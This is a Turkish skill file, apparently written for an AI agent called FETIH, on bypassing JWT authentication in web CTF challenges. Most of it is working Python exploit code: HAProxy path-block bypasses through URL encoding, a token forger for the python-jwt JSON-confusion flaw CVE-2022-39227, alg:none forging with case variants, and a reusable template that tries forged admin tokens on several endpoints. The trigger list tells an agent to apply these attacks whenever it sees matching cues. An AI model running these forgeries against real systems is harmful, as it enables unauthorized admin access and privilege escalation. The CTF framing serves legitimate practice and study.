---
name: jwt-web-bypass
description: Web uygulamalarında JWT bypass — alg:none, CVE-2022-39227, SSRF zinciri
tags: [ctf, web, jwt, bypass, alg-none, python-jwt, cve, haproxy, ssrf]
triggers:
  - "JWT Bearer token"
  - "Authorization header"
  - "role: admin"
  - "guest token"
  - "HAProxy 403"
  - "python-jwt"
  - "URL encoded bypass"
  - "double slash bypass"
difficulty: medium
category: web
solved_challenges:
  - "HTB Cyber Apocalypse 2024 - LockTalk (HAProxy + CVE-2022-39227)"
  - "LINE CTF 2024 - jalyboy baby (alg:none Spring)"
adapted_for: fetih
---

# JWT Web Bypass

## Ne Zaman Kullan

- Uygulamada `Authorization: Bearer <token>` header'ı varsa
- Token decode edildiğinde `role`, `admin`, `user`, `guest` gibi claim'ler görünüyorsa
- `/api/admin`, `/api/flag` gibi endpoint'ler 403 dönüyorsa
- `python-jwt` kütüphanesi kullanıldığı düşünülüyorsa (CVE-2022-39227)
- HAProxy veya reverse proxy önünde uygulama varsa (path bypass olabilir)
- Spring Security ile JWT doğrulama yapılıyorsa (alg:none zafiyeti)

---

## HTB Cyber Apocalypse 2024 — LockTalk Tam Çözümü

**Senaryo:** HAProxy, `/api/v1/get_ticket` endpoint'ini blocklıyor. Ancak URL encoding ile bypass edilebilir. Sonra guest JWT alınıp CVE-2022-39227 ile admin'e yükselme.

### Adım 1: HAProxy Bypass

HAProxy kural `/api/v1/get_ticket` path'ini blokluyorsa URL encode dene:

```python
import requests

BASE_URL = "http://<IP>:<PORT>"

# HAProxy /api/v1/get_ticket path'ini bloklıyor
# %2f = /, double-slash veya URL encode ile bypass

# Yöntem 1: Path segment encode
r = requests.get(f"{BASE_URL}/api/v1/%67et_ticket")
print(r.status_code, r.text)

# Yöntem 2: Double slash
r = requests.get(f"{BASE_URL}//api/v1/get_ticket")
print(r.status_code, r.text)

# Yöntem 3: Null byte veya fragment
r = requests.get(f"{BASE_URL}/api/v1/get_ticket%23")
print(r.status_code, r.text)
```

### Adım 2: Guest JWT Al

```python
import requests

BASE_URL = "http://<IP>:<PORT>"

# HAProxy bypass ile guest token al
r = requests.get(f"{BASE_URL}/api/v1/%67et_ticket")
data = r.json()
guest_token = data["ticket"]  # veya data["token"]
print("Guest token:", guest_token)

# Token'ı decode et (imzayı doğrulamadan)
import base64, json

def jwt_decode_payload(token):
    parts = token.split(".")
    # Base64 padding düzelt
    payload_b64 = parts[1] + "=="
    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
    return payload

payload = jwt_decode_payload(guest_token)
print("Payload:", json.dumps(payload, indent=2))
# Çıktı: {"role": "guest", "user": "...", ...}
```

### Adım 3: CVE-2022-39227 ile Admin Token Forge

**CVE-2022-39227:** `python-jwt < 3.3.4` sürümlerinde JSON token içine `" "` (boşluk) veya unicode karakterlerle ikinci bir payload inject edilebilir. Kütüphane signature'ı ilk payload'a göre doğrular ama claim'leri ikinci (sahte) payload'dan okur.

```python
# pip install python-jwt==3.3.2  (zafiyetli versiyon test için)
# Gerçek exploit için manuel JSON manipulation

import json
import base64

def forge_token_cve_2022_39227(original_token, new_claims):
    """
    CVE-2022-39227: python-jwt JSON confusion attack
    Orijinal token'ın signature'ını koruyarak claim'leri değiştirir.
    """
    header_b64, payload_b64, signature = original_token.split(".")

    # Orijinal payload'ı decode et
    padded = payload_b64 + "==" 
    orig_payload = json.loads(base64.urlsafe_b64decode(padded))

    # Yeni payload oluştur
    new_payload = {**orig_payload, **new_claims}

    # JSON confusion: orijinal payload + " " + yeni payload birleştir
    # python-jwt ilk { } bloğuna bakarak signature doğrular
    # ama claim okurken son { } bloğunu alır
    confused_payload = json.dumps(orig_payload) + ' ' + json.dumps(new_payload)

    # Base64 encode (padding olmadan)
    confused_b64 = base64.urlsafe_b64encode(
        confused_payload.encode()
    ).rstrip(b"=").decode()

    forged_token = f"{header_b64}.{confused_b64}.{signature}"
    return forged_token


# Kullanım
import requests

BASE_URL = "http://<IP>:<PORT>"

# 1. Guest token al (HAProxy bypass ile)
r = requests.get(f"{BASE_URL}/api/v1/%67et_ticket")
guest_token = r.json()["ticket"]

# 2. Admin token forge et
admin_token = forge_token_cve_2022_39227(guest_token, {"role": "administrator"})
print("Forged admin token:", admin_token)

# 3. Korumalı endpoint'e eriş
headers = {"Authorization": f"Bearer {admin_token}"}

r = requests.get(f"{BASE_URL}/api/v1/admin/flag", headers=headers)
print(r.status_code, r.text)

r = requests.get(f"{BASE_URL}/api/v1/get_flag", headers=headers)
print(r.status_code, r.text)
```

---

## LINE CTF 2024 — jalyboy baby (alg:none bypass)

**Senaryo:** Spring Boot uygulaması `Jwts.parser().parse()` kullanıyor (`.verifyWith()` yok). Bu durumda imza doğrulaması yapılmaz, alg:none geçerlidir.

### alg:none Token Oluşturma

```python
import base64
import json
import requests

def create_alg_none_token(payload_dict):
    """
    alg:none JWT oluştur — imza yoktur, Spring bazı parser'larda kabul eder.
    """
    # Header
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()

    # Payload
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload_dict, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()

    # Signature yok (boş string)
    token = f"{header_b64}.{payload_b64}."
    return token


BASE_URL = "http://<IP>:<PORT>"

# Normal kullanıcı token al
r = requests.post(f"{BASE_URL}/login", json={"username": "guest", "password": "guest"})
print(r.json())

# alg:none ile admin token forge
admin_payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 1700000000,
    "exp": 9999999999
}

forged = create_alg_none_token(admin_payload)
print("alg:none token:", forged)

# Korumalı endpoint'e gönder
headers = {"Authorization": f"Bearer {forged}"}
r = requests.get(f"{BASE_URL}/flag", headers=headers)
print(r.status_code, r.text)

# Spring bazen "Bearer" olmadan da kabul eder
r = requests.get(f"{BASE_URL}/flag", headers={"Authorization": forged})
print(r.status_code, r.text)
```

### alg Varyasyonları (bazı parser'lar büyük/küçük harf duyarlı değil)

```python
# Dene sırasıyla:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header = {"alg": alg, "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b"=").decode()
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps({"sub": "admin", "role": "admin"}).encode()
    ).rstrip(b"=").decode()
    token = f"{header_b64}.{payload_b64}."
    r = requests.get(f"{BASE_URL}/admin", headers={"Authorization": f"Bearer {token}"})
    print(f"alg={alg}: {r.status_code}")
```

---

## Python Exploit Şablonu (Genel JWT Manipülasyon)

```python
#!/usr/bin/env python3
"""
CTF JWT Bypass — Genel Şablon
Kullanım: scripti hedefe göre düzenle
"""

import requests
import base64
import json
import sys

TARGET = "http://<IP>:<PORT>"
SESSION = requests.Session()
SESSION.proxies = {"http": "http://127.0.0.1:8080"}  # Burp proxy için, istemiyorsan kaldır


def b64_decode_jwt_part(part):
    """JWT base64url decode (padding otomatik)"""
    padded = part + "=" * (4 - len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def b64_encode_jwt_part(data):
    """JWT base64url encode (padding kaldır)"""
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b"=").decode()


def analyze_token(token):
    """Token'ı analiz et ve yazdır"""
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Geçerli JWT değil")
        return
    header = b64_decode_jwt_part(parts[0])
    payload = b64_decode_jwt_part(parts[1])
    print(f"[*] Header:  {json.dumps(header, indent=2)}")
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")
    print(f"[*] Sig:     {parts[2][:20]}...")
    return header, payload, parts[2]


def alg_none_forge(original_token, new_payload_claims):
    """alg:none bypass"""
    parts = original_token.split(".")
    header = b64_decode_jwt_part(parts[0])
    payload = b64_decode_jwt_part(parts[1])

    header["alg"] = "none"
    payload.update(new_payload_claims)

    return f"{b64_encode_jwt_part(header)}.{b64_encode_jwt_part(payload)}."


def main():
    # 1. Önce token al
    print("[*] Token alınıyor...")
    r = SESSION.get(f"{TARGET}/api/v1/get_ticket")
    print(f"    Status: {r.status_code}")

    token = r.json().get("ticket") or r.json().get("token") or r.json().get("access_token")
    if not token:
        print("[!] Token bulunamadı:", r.text)
        sys.exit(1)

    print(f"[*] Token alındı: {token[:40]}...")
    analyze_token(token)

    # 2. Forge et
    forged = alg_none_forge(token, {"role": "administrator", "sub": "admin"})
    print(f"\n[*] Forged token: {forged[:60]}...")

    # 3. Korumalı endpoint'leri dene
    endpoints = ["/api/v1/flag", "/api/v1/admin/flag", "/flag", "/admin"]
    for ep in endpoints:
        r = SESSION.get(
            f"{TARGET}{ep}",
            headers={"Authorization": f"Bearer {forged}"}
        )
        print(f"[*] {ep}: {r.status_code} | {r.text[:100]}")


if __name__ == "__main__":
    main()
```

---

## Tuzaklar

- **HAProxy bypass çalışmıyor:** Farklı encoding dene — `%2f`, double-slash `//`, null byte `%00`, nokta `./`
- **alg:none reddediliyor:** Header'da `"typ": "JWT"` eksik olabilir. Bazı kütüphaneler `"typ"` olmadan reddeder.
- **CVE-2022-39227 çalışmıyor:** `python-jwt >= 3.3.4` patchli. Versiyon bilgisi için `/requirements.txt` veya Docker image layer'larına bak.
- **Signature zorunlu:** RS256 kullanılıyorsa public key'i private key olarak verme saldırısını (alg confusion: RS256→HS256) dene.
- **Token expire oluyor:** `"exp"` claim'ini `9999999999` gibi uzak bir tarihe ayarla.
- **Burp ile debug:** `SESSION.proxies = {"http": "http://127.0.0.1:8080"}` satırını aktif bırak, her isteği Burp'te gör.

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 3b45f2127fdc9705
-->

